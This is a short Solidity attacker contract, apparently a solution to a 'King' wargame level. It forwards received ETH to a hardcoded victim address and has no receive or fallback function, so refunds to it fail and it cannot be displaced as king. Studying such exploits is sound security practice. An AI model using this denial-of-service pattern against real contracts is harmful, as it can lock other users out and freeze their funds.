// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./king.sol";
import "hardhat/console.sol";

contract Attacker{
    King victimContract; //Contractname contractvariable

    address payable victimAddress = 0xdC6663C6Df91f4d9e58A59c632c93309c16BFC3F; 
    event sendPrizeToKing(address indexed senderAddr, uint senderValue);
    
    uint256 public balanceToSend;

    // // // import a contract
    constructor() public {
        victimContract = King(victimAddress);
    }

    function receivePrize() public payable {
        balanceToSend = msg.value;
        emit sendPrizeToKing(msg.sender, msg.value);
    }

    function triggerSend() external payable {
       victimAddress.call.value(balanceToSend)("");
    }

}
